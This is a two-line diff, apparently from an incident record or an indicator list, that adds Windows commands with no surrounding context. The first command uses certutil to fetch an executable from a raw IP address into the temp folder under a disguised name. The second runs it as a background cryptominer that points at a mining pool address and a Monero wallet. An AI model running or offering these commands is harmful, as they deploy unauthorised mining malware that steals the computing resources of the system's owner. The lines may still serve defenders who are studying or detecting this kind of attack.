@@ -1,0 +1,2 @@
+1) certutil.exe -urlcache -split -f http://104.244.75.25/ww.exe C:/Windows/temp/xsd.exe
+2) cmd.exe /c C:/Windows/temp/xsd.exe --donate-level=1 -k -o 91.134.246.179:5790 -u 46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ -p x -B
